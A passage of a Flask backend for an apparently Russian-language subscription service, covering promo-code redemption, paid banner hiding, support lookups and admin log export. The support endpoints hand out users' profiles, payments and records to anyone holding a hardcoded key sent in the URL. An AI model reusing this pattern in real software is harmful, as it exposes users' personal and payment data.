            description=f"Лимит использований промокода",
            mdata={"promo": promocode.to_dict(), "message": "Лимит использований промокода", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({"status": "error", "message": "Промокод превысил лимит использований"}), 400

    if not promocode.is_active:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Промокод неактивен",
            mdata={"promo": promocode.to_dict(), "message": "Промокод неактивен", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({"status": "error", "message": "Промокод неактивен"}), 400

    user = User.query.filter(User.id == user_id).first()
    user_before = User.query.filter(User.id == user_id).first()
    if not user:
        return jsonify({"status": "error", "message": "Пользователь не найден"}), 400

    if UserPromocode.query.filter_by(promocode_id=promocode.id, user_id=user_id).first():
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Повторное использование промокода",
            mdata={"promo": code, "message": "Повторное использование промокода", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({"status": "error", "message": "Вы уже использовали этот промокод"}), 400

    now = int(time.time())

    # 🎁 Промокод на бесплатные закрытия
    if promocode.promo_type == "free_closes":
        user.free_closes += promocode.value

        promocode.current_uses += 1
        db.session.add(UserPromocode(user_id=user_id, promocode_id=promocode.id))
        db.session.commit()
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Использование промокода",
            mdata=safe_json(
                {"promo": promocode.to_dict(), "message": "Успешное использование промокода", "user_id": user_id, "user_after": user.to_dict(), "user_before": user_before.to_dict()}
            ),
            detail_url=None,
            request=request
        )
        return jsonify({
            "status": "success",
            "message": f"Вы получили {promocode.value} бесплатных закрытий"
        }), 200

    # 🔑 Промокод на подписку
    elif promocode.promo_type in ["plus", "premium"]:
        current_type = user.subscription_type or "N"
        current_exp = user.subscription_expiration or 0
        new_type = promocode.promo_type
        new_duration = promocode.value

        # Приоритеты: N < plus < premium
        priority = {"N": 0, "plus": 1, "premium": 2}
        user_priority = priority.get(current_type, 0)
        promo_priority = priority.get(new_type, 0)

        if user_priority > promo_priority and current_exp > now:
            log_action_async(
                user_id=user_id,
                action_type="promo_use",
                description=f"Отказ в использование промокода",
                mdata={"promo": promocode.to_dict(), "message": f"Активная подписка более высокого уровня ({current_type})", "user_id": user_id},
                detail_url=None,
                request=request
            )
            return jsonify({
                "status": "error",
                "message": f"У вас уже есть активная подписка более высокого уровня ({current_type})"
            }), 400

        if current_exp > now and current_type == new_type:
            user.subscription_expiration = current_exp + new_duration
        else:
            user.subscription_expiration = now + new_duration

        user.subscription_type = new_type

        promocode.current_uses += 1
        db.session.add(UserPromocode(user_id=user_id, promocode_id=promocode.id))
        db.session.commit()
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Использование промокода",
            mdata=safe_json(
            {"promo": promocode.to_dict(), "message": "Успешное использование промокода", "user_id": user_id,
                   "user_after": user.to_dict(), "user_before": user_before.to_dict()}
            ),
            detail_url=None,
            request=request
        )
        return jsonify({
            "status": "success",
            "message": f"Вы получили подписку {new_type}"
        }), 200

    return jsonify({"status": "error", "message": "Неверный тип промокода"}), 400

@app.route("/pay/confirm")
def pay_confirm():
    if request.args.get("hides"):
        return render_template("hidespay.html")
    return render_template("pay_confirm.html")

@app.route("/api/consept")
def consent():
    user_id = session.get('user_id')
    if user_id:
        log_user_consent(request,user_id,"Согласие на обработку персональных данных")
    return {"status": "success"}

@app.route("/user-agreement")
def user_agreement():
    return send_file(
        f'static/user-agreement-{LAST_UA_DATE}.pdf',
        mimetype='application/pdf',
        as_attachment=False,  # True for download
        download_name=f'user-agreement-{LAST_UA_DATE}.pdf'  # For Flask 2.0+
    )
@app.route("/api/close/fake")
def close_fake():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    user = User.query.get(user_id)
    if not user:
        return jsonify({"status": "error", "message": "User not found"}), 404

    now = int(time.time())
    # Проверяем, есть ли активное закрытие (closed_to > текущего времени)
    active_close = FakeMessageClose.query.filter(
        FakeMessageClose.user_id == user_id,
        FakeMessageClose.closed_to > now
    ).first()

    if active_close:
        return jsonify({"status": "success", "message": "You have already closed today"}), 200

    # Проверяем, может ли пользователь закрыть
    can_close = (
        user.subscription_type in ["plus", "premium"] or
        user.free_closes > 0
    )

    if not can_close:
        log_action_async(
            user_id=user_id,
            action_type="fake_close",
            description=f"Недостаточно скрытий для скрытия плашки",
            mdata={"user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({
            "status": "error",
            "message": "У вас закончились бесплатные скрытия. Приобретите <a href='/premium'>подписку</a> или активируйте промокод"
        }), 400

    try:
        # Всё в одной транзакции
        with db.session.begin_nested():
            if user.free_closes > 0 and user.subscription_type not in ["plus", "premium"]:
                user.free_closes -= 1

            client_data = get_client_info(request)
            if not client_data:
                return jsonify({"status": "error", "message": "Ошибка, попробуйте позже"}), 400

            # Создаём запись с закрытием на 24 часа (вычисляем closed_to здесь!)
            fk = FakeMessageClose(
                user_id=user_id,
                ip=client_data['network']['ip'],
                user_agent=client_data['network']['user_agent'],
                browser=client_data['device']['browser'],
                system=client_data['device']['os'],
                device=client_data['device']['device'],
                closed_to=now + 24 * 60 * 60  # Текущее время + 24 часа
            )
            db.session.add(fk)

        db.session.commit()
        log_action_async(
            user_id=user_id,
            action_type="fake_close",
            description=f"Успешное скрытие плашки фейк",
            mdata={"data": fk.to_dict(), "user_id": user_id,},
            detail_url=None,
            request=request
        )
        return jsonify({"status": "success"}), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({"status": "error", "message": "Ошибка, попробуйте позже"}), 500

@app.route("/api/close/check")
def close_check():
    user_id = session.get('user_id')
    if user_id:
        user = User.query.filter(User.id==user_id).first()
        if (user.subscription_type == "plus" or user.subscription_type == "premium") and user.subscription_expiration > int(time.time()):
            return jsonify({"status": "success"}), 200
        entry = FakeMessageClose.query.filter(
            (FakeMessageClose.user_id == user_id) &
            (FakeMessageClose.closed_to > int(time.time()))
        ).first()
        if entry:
            return jsonify({"status": "success"}), 200

    return jsonify({"status": "error"}), 400

SUPPORT_ACCESS_KEY = "a7Fk3pR9qW2zYb6LmN8cX4vT5sJ1dG0hU7iO"
@app.route("/api/support/profiles")
def support_profiles():
    key = request.args.get("key")
    user_id = request.args.get("id")
    user = User.query.filter(User.user_id == user_id).first()
    if not user:
        return jsonify({"status": "error", "message": "<UNK> <UNK> <UNK>"}), 400
    if key == SUPPORT_ACCESS_KEY:
        profiles = Profile.query.filter(Profile.user_id == user.id).all()
        return jsonify({"status": "success", "profiles": [profile.to_dict() for profile in profiles]}), 200
    return jsonify({"status": "error", "message": "Unauthorized"}), 401

@app.route("/api/support/payments")
def support_payments():
    key = request.args.get("key")
    user_id = request.args.get("id")
    user = User.query.filter(User.user_id == user_id).first()
    if key == SUPPORT_ACCESS_KEY:
        payments = Payment.query.filter(Payment.user_id == user.id).all()
        return jsonify({"status": "success", "payments": [payment.to_dict() for payment in payments]}), 200
    return jsonify({"status": "error", "message": "Unauthorized"}), 401

@app.route("/api/support/closes")
def support_close():
    key = request.args.get("key")
    user_id = request.args.get("id")
    user = User.query.filter(User.user_id == user_id).first()
    if key == SUPPORT_ACCESS_KEY:
        closes = FakeMessageClose.query.filter(FakeMessageClose.user_id == user.id).all()
        return jsonify({"status": "success", "closes": [close.to_dict() for close in closes]}), 200
    return jsonify({"status": "error", "message": "Unauthorized"}), 401

@app.route("/api/support/info")
def support_clients():
    key = request.args.get("key")
    user_id = request.args.get("id")
    if key == SUPPORT_ACCESS_KEY:
        user = User.query.filter(User.user_id == user_id).first()
        if not user:
            return jsonify({"status": "error", "message": "User not found"}), 404
        return jsonify({"status": "success", "user": user.to_dict()}), 200
    return jsonify({"status": "error", "message": "Unauthorized"}), 401

@app.route("/api/support/promocodes")
def support_promocodes():
    key = request.args.get("key")
    user_id = request.args.get("id")
    if key == SUPPORT_ACCESS_KEY:
        user = User.query.filter(User.user_id == user_id).first()
        if not user:
            return jsonify({"status": "error", "message": "User not found"}), 404
        promo = UserPromocode.query.filter(UserPromocode.user_id == user.id).all()
        promocodes = []
        for p in promo:
            promocodes.append(Promocode.query.filter(Promocode.id == p.promocode_id).first())

        return jsonify({"status": "success", "promocodes": [promocode.to_dict() for promocode in promocodes]}), 200
    return jsonify({"status": "error", "message": "Unauthorized"}), 401

#ADMIN PROMOCODE
# API для промокодов
@app.route('/api/promocodes', methods=['GET', 'POST'])
def handle_promocodes():
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    if request.method == 'GET':
        promocodes = Promocode.query.all()
        return jsonify([{
            'id': p.id,
            'code': p.code,
            'promo_type': p.promo_type,
            'value': p.value,
            'max_uses': p.max_uses,
            'current_uses': p.current_uses,
            'is_active': p.is_active,
            'user_id': p.user_id,
            'discount_multi_use': p.discount_multi_use
        } for p in promocodes])

    elif request.method == 'POST':
        data = request.get_json()

        # Проверка на существующий промокод
        if Promocode.query.filter_by(code=data['code']).first():
            return jsonify({'message': 'Промокод с таким кодом уже существует'}), 400

        promocode = Promocode(
            code=data['code'],
            promo_type=data['promo_type'],
            value=data['value'],
            max_uses=data['max_uses'],
            user_id=data.get('user_id'),
            current_uses=0,
            discount_multi_use=data.get('discount_multi_use', False)
        )

        db.session.add(promocode)
        db.session.commit()

        return jsonify({
            'id': promocode.id,
            'code': promocode.code,
            'promo_type': promocode.promo_type,
            'value': promocode.value,
            'max_uses': promocode.max_uses,
            'current_uses': promocode.current_uses,
            'is_active': promocode.is_active,
            'user_id': promocode.user_id,
            'discount_multi_use': promocode.discount_multi_use
        }), 201


@app.route('/api/promocodes/<int:promo_id>', methods=['GET', 'PUT', 'DELETE'])
def handle_promocode(promo_id):
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    promocode = Promocode.query.get_or_404(promo_id)

    if request.method == 'GET':
        return jsonify({
            'id': promocode.id,
            'code': promocode.code,
            'promo_type': promocode.promo_type,
            'value': promocode.value,
            'max_uses': promocode.max_uses,
            'current_uses': promocode.current_uses,
            'is_active': promocode.is_active,
            'user_id': promocode.user_id,
            'discount_multi_use': promocode.discount_multi_use
        })

    elif request.method == 'PUT':
        data = request.get_json()

        # Проверка на существующий промокод (кроме текущего)
        if 'code' in data and Promocode.query.filter(Promocode.code == data['code'], Promocode.id != promo_id).first():
            return jsonify({'message': 'Промокод с таким кодом уже существует'}), 400

        promocode.code = data.get('code', promocode.code)
        promocode.promo_type = data.get('promo_type', promocode.promo_type)
        promocode.value = data.get('value', promocode.value)
        promocode.max_uses = data.get('max_uses', promocode.max_uses)
        promocode.user_id = data.get('user_id', promocode.user_id)
        promocode.discount_multi_use = data.get('discount_multi_use', promocode.discount_multi_use)
        promocode.is_active = data.get('is_active', promocode.is_active)

        db.session.commit()
        return jsonify({
            'id': promocode.id,
            'code': promocode.code,
            'promo_type': promocode.promo_type,
            'value': promocode.value,
            'max_uses': promocode.max_uses,
            'current_uses': promocode.current_uses,
            'is_active': promocode.is_active,
            'user_id': promocode.user_id,
            'discount_multi_use': promocode.discount_multi_use
        })

    elif request.method == 'DELETE':
        # Удаляем все использования этого промокода
        UserPromocode.query.filter_by(promocode_id=promo_id).delete()

        db.session.delete(promocode)
        db.session.commit()
        return jsonify({'message': 'Промокод удален'}), 200


@app.route('/api/promocodes/<int:promo_id>/status', methods=['PATCH'])
def toggle_promocode_status(promo_id):
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    promocode = Promocode.query.get_or_404(promo_id)
    data = request.get_json()

    promocode.is_active = data['is_active']
    db.session.commit()

    return jsonify({
        'id': promocode.id,
        'code': promocode.code,
        'promo_type': promocode.promo_type,
        'value': promocode.value,
        'max_uses': promocode.max_uses,
        'current_uses': promocode.current_uses,
        'is_active': promocode.is_active,
        'user_id': promocode.user_id,
        'discount_multi_use': promocode.discount_multi_use
    })


# API для активаций промокодов
@app.route('/api/promocodes/<int:promo_id>/activations', methods=['GET'])
def get_promocode_activations(promo_id):
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    try:
        # Проверяем существование промокода
        promocode = Promocode.query.get(promo_id)
        if not promocode:
            return jsonify({'message': 'Promocode not found'}), 404

        # Получаем активации с информацией о пользователях
        activations = db.session.query(
            UserPromocode,
            User
        ).join(
            User, User.id == UserPromocode.user_id  # Связь по User.id, а не user_id
        ).filter(
            UserPromocode.promocode_id == promo_id
        ).all()

        result = [{
            'id': act.UserPromocode.id,
            'created_at': None,
            'user': {
                'id': act.User.id,
                'user_id': act.User.user_id,  # Внешний ID пользователя
                'username': act.User.username,
                'is_admin': act.User.is_admin,
                'subscription_type': act.User.subscription_type,
                'subscription_expiration': act.User.subscription_expiration,
                'free_closes': act.User.free_closes
            } if act.User else None
        } for act in activations]

        return jsonify({
            'promocode': {
                'id': promocode.id,
                'code': promocode.code,
                'type': promocode.promo_type
            },
            'activations': result
        })

    except Exception as e:
        app.logger.error(f"Error fetching promocode activations: {str(e)}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/activations', methods=['GET'])
def get_all_activations():
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    try:
        # Используем явное указание условий соединения
        activations = db.session.query(
            UserPromocode,
            User,
            Promocode
        ).join(
            User, User.id == UserPromocode.user_id  # Изменил на User.id вместо User.user_id
        ).join(
            Promocode, Promocode.id == UserPromocode.promocode_id
        ).all()

        if not activations:
            return jsonify({'message': 'No activations found'}), 404

        result = []
        for activation in activations:
            # Добавляем проверку на существование связанных записей
            user_data = {
                'id': activation.User.id,
                'username': activation.User.username,
                'is_admin': activation.User.is_admin,
                'subscription_type': activation.User.subscription_type,
                'subscription_expiration': activation.User.subscription_expiration,
                'free_closes': activation.User.free_closes
            } if activation.User else None

            promocode_data = {
                'id': activation.Promocode.id,
                'code': activation.Promocode.code,
                'promo_type': activation.Promocode.promo_type
            } if activation.Promocode else None

            result.append({
                'id': activation.UserPromocode.id,
                'created_at': None,
                'user': user_data,
                'promocode': promocode_data
            })

        return jsonify(result)

    except Exception as e:
        app.logger.error(f"Error fetching activations: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/admin/promo')
def admin_promo():
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    return render_template("admin_promo.html")
@app.route("/test-log", methods=["GET", "POST"])
def test_log():
    log_action_async(
        user_id=session.get('user_id'),  # Заменить на ID пользователя или None, если неавторизован
        action_type="test_action",
        description="Ручной тест логирования через функцию",
        request=request,
        mdata={"source": "test"},
        detail_url="/admin/users/1"
    )
    return "✅ Лог успешно создан"
@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    adm_user_id = session.get('user_id')
    user = User.query.filter_by(id=adm_user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404

    profiles = [p.to_dict() for p in user.profiles] if hasattr(user, 'profiles') else []
    # Если в модели User у тебя связь называется 'profile' (один), поменяй на 'profiles' (список)

    user_data = user.to_dict()

    return jsonify({
        "user": user_data,
        "profiles": profiles
    })


@app.route('/api/logs')
def api_logs():
    adm_user_id = session.get('user_id')
    user = User.query.filter_by(id=adm_user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    # Параметры фильтрации и пагинации
    user_id = request.args.get('user_id', type=int)
    action_type = request.args.get('action_type', type=str)
    date_from = request.args.get('date_from', type=str)
    date_to = request.args.get('date_to', type=str)
    ip= request.args.get('ip', type=str)
    page = request.args.get('page', default=1, type=int)
    limit = request.args.get('limit', default=100, type=int)

    filters = []

    if user_id:
        filters.append(ActionLog.user_id == user_id)

    if action_type:
        filters.append(ActionLog.action_type.ilike(f"%{action_type}%"))

    if date_from:
        try:
            date_from_parsed = datetime.strptime(date_from, "%Y-%m-%d")
            filters.append(ActionLog.timestamp >= date_from_parsed)
        except ValueError:
            pass

    if date_to:
        try:
            date_to_parsed = datetime.strptime(date_to, "%Y-%m-%d")
            filters.append(ActionLog.timestamp <= date_to_parsed)
        except ValueError:
            pass
    if ip:
        filters.append(ActionLog.ip.ilike(f"%{ip}%"))

    query = ActionLog.query.filter(and_(*filters)).order_by(ActionLog.timestamp.desc())

    total_logs = query.count()
    total_pages = (total_logs + limit - 1) // limit

    logs = query.offset((page - 1) * limit).limit(limit).all()

    return jsonify({
        "logs": [log.to_dict() for log in logs],
        "page": page,
        "total_pages": total_pages
    })
@app.route("/api/log/<int:log_id>")
def api_log_detail(log_id):
    adm_user_id = session.get('user_id')
    user = User.query.filter_by(id=adm_user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    log = ActionLog.query.get(log_id)
    if not log:
        return jsonify({"error": "Log not found"}), 404
    return jsonify(log.to_dict())
@app.route('/api/export')
def export_action_logs():
    adm_user_id = session.get('user_id')
    user = User.query.filter_by(id=adm_user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403
    # Получаем параметры фильтрации из query string
    user_id = request.args.get('user_id', type=int)
    action_type = request.args.get('action_type', type=str)
    date_from = request.args.get('date_from', type=str)
    date_to = request.args.get('date_to', type=str)
    ip = request.args.get('ip', type=str)
    filters = []

    if user_id:
        filters.append(ActionLog.user_id == user_id)

    if action_type:
        filters.append(ActionLog.action_type.ilike(f"%{action_type}%"))

    if date_from:
        try:
            date_from_parsed = datetime.strptime(date_from, "%Y-%m-%d")
            filters.append(ActionLog.timestamp >= date_from_parsed)
        except ValueError:
            pass

    if date_to:
        try:
            date_to_parsed = datetime.strptime(date_to, "%Y-%m-%d")
            filters.append(ActionLog.timestamp <= date_to_parsed)
        except ValueError:
            pass
    if ip:
        filters.append(ActionLog.ip.ilike(f"%{ip}%"))

    query = ActionLog.query.filter(and_(*filters)).order_by(ActionLog.timestamp.desc())

    logs = query.all()

    # Конвертируем объекты в словари
    logs_data = [log.to_dict() for log in logs]

    # Создаём ZIP в памяти
    memory_file = BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Добавляем один файл logs.json
        zf.writestr('logs.json', json.dumps(logs_data, ensure_ascii=False, indent=2))

    memory_file.seek(0)
    filename = f"export_gu2_{datetime.utcnow().strftime('%Y-%m-%d_%H-%M-%S')}.zip"
    log_action_async(
        user_id=adm_user_id,
        action_type="export_log",
        description=f"Экспорт логов - {datetime.utcnow().strftime('%Y-%m-%d_%H-%M-%S')}",
        mdata=safe_json({
            "file": filename,
            "filters": {
                "ip": ip,
                "date_from": date_from,
                "date_to": date_to,
                "action_type": action_type,
                "user_id": user_id,
            }
        }),
        request=request,
        detail_url=None
    )

    return send_file(
        memory_file,
        mimetype='application/zip',
        download_name=filename,
        as_attachment=True
    )
@app.route('/admin/logs')
def get_logs_async():
    user_id = session.get('user_id')
    user = User.query.filter_by(id=user_id).first()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if not user.is_admin:
        return jsonify({"error": "User not admin"}), 403

    return render_template("logs.html")

app.run(host='0.0.0.0', port=5000)
